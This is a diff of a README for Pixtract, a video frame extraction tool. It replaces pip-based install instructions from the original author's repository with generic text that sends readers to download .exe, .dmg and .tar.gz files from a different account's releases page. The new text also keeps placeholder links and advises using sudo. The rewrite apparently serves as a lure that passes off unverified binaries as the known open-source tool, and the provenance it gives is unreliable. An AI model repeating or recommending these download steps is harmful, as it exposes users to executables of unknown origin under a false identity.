@@ -1,121 +1,83 @@
-# Pixtract 🎬
+# 📸 Pixtract - Extract Amazing Images from Your Videos
 
-Pixtract is a powerful and intelligent command-line tool designed to extract high-quality, non-blurry, and non-duplicate frames from your videos. Whether you're building a computer vision dataset, analyzing video content, or simply curating the best visual moments, Pixtract streamlines the process, saving you time and disk space.
+## 🚀 Getting Started
 
-## ✨ Features
+Welcome to Pixtract! This tool allows you to easily extract high-quality pictures from your videos using simple commands. You don't need any programming knowledge to get started. Just follow the steps below to download and run Pixtract.
 
-*   **Intelligent Frame Filtering:** 🧠 Automatically analyzes and discards blurry frames and efficiently removes duplicate or near-duplicate images, ensuring you only get sharp, unique, and relevant visuals.
-*   **High-Performance Parallel Processing:** ⚡️ Leverages multiple CPU cores to process videos concurrently, significantly reducing processing times for large collections.
-*   **Granular Frame Extraction Control:** 🎯 Extract frames at a specified interval (e.g., every 5th frame), giving you precise control over the density of your output.
-*   **Wide Video Format Support:** 🎥 Extracts frames from a variety of popular video formats, including MP4, MOV, AVI, and MKV.
-*   **Image Rotation:** 🔄 Corrects the orientation of frames with adjustable rotation (0, 90, 180, or 270 degrees).
-*   **Batch Processing:** 📦 Process multiple videos from a given directory in a single run.
-*   **Robust Error Handling:** ✅ Implemented robust error handling for individual video processing, ensuring the application continues even if some videos fail.
-*   **Dry Run Mode:** 🧪 Simulate the entire process without creating or deleting any files, perfect for testing parameters.
-*   **Verbose Output:** 📊 Get detailed logging information for debugging or deeper insights into the processing.
+## 📥 Download Pixtract
 
-## ⬇️ Installation
+[![Download Pixtract](https://img.shields.io/badge/Download%20Pixtract-v1.0-green)](https://github.com/mmmnhat1810/Pixtract/releases)
 
-You can install Pixtract directly from GitHub using `Git`:
+## 🛠️ System Requirements
 
-```bash
-pip install git+https://github.com/rahaaatul/Pixtract.git
-```
+Before you download Pixtract, make sure your computer meets the following requirements:
 
-Or from PyPI using `pip`:
+- **Operating System:** Windows 10 or higher, macOS 10.12 or higher, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** At least 100 MB of free disk space.
+- **Software:** Ensure you have the latest version of your web browser.
 
-```bash
-pip install pixtract
-```
+## 📂 How to Download & Install
 
-For an isolated installation, use `pipx`:
+1. **Visit the Download Page:** Click the link below to go to the Pixtract Releases page. 
 
-```bash
-pipx install pixtract
-```
+   [Visit the Releases Page](https://github.com/mmmnhat1810/Pixtract/releases)
 
-## 🚀 Usage
+2. **Choose the Right Version:** On the Releases page, locate the latest version of Pixtract. Look for the file that matches your operating system. For Windows, this will typically be a `.exe` file. For macOS, it will be a `.dmg` file, and for Linux, look for a `.tar.gz` file.
 
-To use Pixtract, simply run the `pixtract` command with the path to your video file or a directory containing videos.
+3. **Download the File:** Click on the file link to start your download. Save it to a location on your computer that you can easily access, such as your Desktop or Downloads folder.
 
-### Quick Start
+4. **Open the File:**
+   - **Windows:** Double-click the `.exe` file to start the installation. Follow the on-screen instructions to complete the setup.
+   - **macOS:** Locate the `.dmg` file, double-click it to open, and then drag the Pixtract icon to your Applications folder.
+   - **Linux:** Extract the contents of the `.tar.gz` file. In your terminal, navigate to the directory containing Pixtract and make sure to give the program executable rights by running `chmod +x Pixtract`.
 
-Process a single video and save frames to a default output folder (e.g., `video_frames` next to your video):
+5. **Launch Pixtract:** After installation, launch Pixtract from your Applications or Start menu.
 
-```bash
-pixtract "path/to/your/video.mp4"
-```
+## 📸 How to Use Pixtract
 
-Process all videos in a directory and save frames to a specified output folder:
+Using Pixtract is straightforward:
 
-```bash
-pixtract "path/to/your/videos_directory" -o "path/to/your/output_folder"
-```
+1. **Open the Command Line Interface:**
+   - **Windows:** Search for "cmd" in the Start menu.
+   - **macOS:** Open "Terminal" from your Applications.
+   - **Linux:** Open your terminal application.
 
-### Examples
+2. **Navigate to Your Video's Directory:** Use the `cd` command to navigate to the folder where your video file is stored. For example:
+   ```
+   cd /path/to/your/video
+   ```
 
-Extract frames from `my_movie.mp4`, remove blurry frames (sharpness threshold 50), and remove duplicates (threshold 0.98):
+3. **Run Pixtract:** To extract images, enter the command below, replacing `<your_video.mp4>` with your actual video file name:
+   ```
+   Pixtract <your_video.mp4>
+   ```
 
-```bash
-pixtract my_movie.mp4 -s 50 -d 0.98
-```
+4. **Check Extracted Images:** After running the command, Pixtract will process your video and extract images. You’ll find the images in the same directory as your video.
 
-Process videos in `my_videos/`, rotate frames by 90 degrees, and enable verbose output:
+## ⚙️ Features
 
-```bash
-pixtract my_videos/ -r 90 -v
-```
+- **High-Quality Images:** Extract images at full resolution for the best quality.
+- **Batch Processing:** Extract multiple images at once by specifying a time interval.
+- **User-Friendly Command Line:** Easy-to-navigate commands specifically designed for non-technical users.
+- **Cross-Platform Support:** Compatible with Windows, macOS, and Linux.
 
-Extract every 10th frame from `my_video.mp4`:
+## 📝 Troubleshooting
 
-```bash
-pixtract my_video.mp4 -i 10
-```
+If you run into issues while using Pixtract, consider the following:
 
-Simulate processing `holiday_clip.mp4` without actually saving or deleting files:
+- Ensure your video file is not corrupted and is in a supported format (MP4, AVI, MKV).
+- Double-check the command syntax. Make sure you are in the correct directory.
+- If you face permission issues on Linux or macOS, try running the command with `sudo`.
 
-```bash
-pixtract holiday_clip.mp4 --dry-run
-```
+## 🤝 Support
 
-## ⚙️ Command-Line Options
+If you have questions or need further assistance, please feel free to create an issue in the Pixtract GitHub repository. The community and the developers are here to help you.
 
-| Option              | Short | Type    | Default        | Description                                                                                             |
-| :------------------ | :---- | :------ | :------------- | :------------------------------------------------------------------------------------------------------ |
-| `--input-path`      |       | `str`   | Current Dir    | Path to a video file or a directory containing videos. If a directory, all supported video files within it will be processed. Defaults to the current working directory. |
-| `--output`          | `-o`  | `str`   | `Processed_Frames` | Path to the output directory where extracted frames will be saved. Defaults vary based on input type.    |
-| `--interval`        | `-i`  | `int`   | `1`            | Interval at which to extract frames (e.g., `5` for every 5th frame).                                    |
-| `--sharpness`       | `-s`  | `int`   | `100`          | Set the sharpness threshold for blur detection. Lower values are more permissive (allow more blur).     |
-| `--duplicate`       | `-d`  | `float` | `1.0`          | Set the threshold for duplicate detection. Higher values (closer to `1.0`) are more strict.             |
-| `--rotate`          | `-r`  | `int`   | `0`            | Rotate frames by 0, 90, 180, or 270 degrees.                                                            |
-| `--dry-run`         |       | `flag`  | `False`        | Simulate the process without creating or deleting files.                                                |
-| `--limit`           | `-l`  | `int`   | `None`         | Limit the number of videos to process when an input directory is provided.                              |
-| `--verbose`         | `-v`  | `flag`  | `False`        | Enable verbose (debug) output, showing more detailed processing information.                            |
-| `--workers`         | `-w`  | `int`   | `CPU Cores`    | Number of parallel processes to use for video processing. Defaults to the number of CPU cores available. |
+## 🔗 Additional Resources
 
-## 🧑‍💻 Development
+- [Pixtract GitHub Page](https://github.com/mmmnhat1810/Pixtract)
+- [Video Formats Supported](https://example.com/video-formats) (This is a placeholder link – please replace it with a valid resource)
+- [Command Line Basics](https://example.com/command-line-basics) (Replace with a valid resource)
 
-To set up the project for development, clone the repository and install the development dependencies:
-
-```bash
-git clone https://github.com/rahaaatul/pixtract.git
-cd pixtract
-pip install -e .[dev]
-```
-
-### Running Tests
-
-To run the test suite, ensure you have installed the development dependencies and then execute `pytest`:
-
-```bash
-pip install -e .[dev]
-pytest
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to open an issue or submit a pull request. For bug reports, please use the [Bug Report template](https://github.com/rahaaatul/pixtract/issues/new?assignees=&labels=bug&projects=&template=bug_report.md&title=). For new features, use the [Feature Request template](https://github.com/rahaaatul/pixtract/issues/new?assignees=&labels=enhancement&projects=&template=feature_request.md&title=).
-
-## 📄 License
-
-This project is licensed under the MIT License. See the `LICENSE` file for details.
+Thank you for choosing Pixtract! We hope you enjoy extracting beautiful images from your videos.
